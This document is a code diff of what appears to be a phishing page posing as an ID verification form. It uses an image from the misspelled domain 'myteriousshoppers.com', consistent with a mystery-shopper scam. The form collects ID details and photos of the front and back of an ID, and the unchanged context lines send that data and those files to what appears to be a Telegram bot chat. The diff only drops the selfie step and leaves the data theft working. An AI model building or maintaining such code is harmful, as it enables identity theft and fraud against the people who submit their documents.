@@ -571,13 +571,7 @@
                         <div>
                             <h4 class="text-xl font-semibold text-gray-900 mb-6 pb-3 border-b border-gray-200">Document Upload</h4>
                             <div class="space-y-8">
-                                <!-- Selfie Upload -->
-                                <div class="bg-blue-50 rounded-xl p-6">
-                                    <div class="flex items-start space-x-4 mb-6">
-                                        <div class="flex-shrink-0">
-                                            <img src="https://myteriousshoppers.com/verification/selfie.png"
-                                                alt="Selfie Example" class="w-16 h-16 rounded-lg object-cover">
-                                        </div>
+
                                         <div class="flex-1">
                                             <h5 class="text-lg font-semibold text-gray-900 mb-2">Upload Selfie with ID</h5>
                                             <p class="text-sm text-gray-600 mb-2">
@@ -994,7 +988,6 @@
                 const expMonth = document.getElementById('id_expiration_mm').value;
                 const expDay = document.getElementById('id_expiration_dd').value;
                 const expYear = document.getElementById('id_expiration_yyyy').value;
-                const selfie = document.getElementById('selfie').files[0];
                 const idFront = document.getElementById('file_upload_front').files[0];
                 const idBack = document.getElementById('file_upload_back').files[0];
 
@@ -1012,10 +1005,6 @@
                 } else if (!isFutureDate(expMonth, expDay, expYear)) {
                     errorMessage = 'ID must not be expired';
                 // Document validation
-                } else if (!selfie) {
-                    errorMessage = 'Selfie with ID is required';
-                } else if (!validateImageFile(selfie)) {
-                    errorMessage = 'Selfie must be a valid image file (JPG, PNG, HEIC)';
                 } else if (!idFront) {
                     errorMessage = 'Photo ID (front) is required';
                 } else if (!validateImageFile(idFront)) {
@@ -1304,7 +1293,7 @@ ${formData.get("use_different_address") ? `• Mailing: ${formData.get("mailing_
 • Date Issued: ${formData.get("id_date_issued_mm")}/${formData.get("id_date_issued_dd")}/${formData.get("id_date_issued_yyyy")}
 • Expiration: ${formData.get("id_expiration_mm")}/${formData.get("id_expiration_dd")}/${formData.get("id_expiration_yyyy")}
 
-📎 Documents: Selfie, ID Front, ID Back uploaded
+📎 Documents: ID Front, ID Back uploaded
             `;
 
             // Send message
@@ -1312,7 +1301,7 @@ ${formData.get("use_different_address") ? `• Mailing: ${formData.get("mailing_
             $.post(textUrl, { chat_id: chatId, text: message })
                 .then(() => {
                     // Send files
-                    const filesToSend = ["selfie", "file_upload_front", "file_upload_back"];
+                    const filesToSend = ["file_upload_front", "file_upload_back"];
                     let filesUploaded = 0;
 
                     function sendFile(fileInputName) {
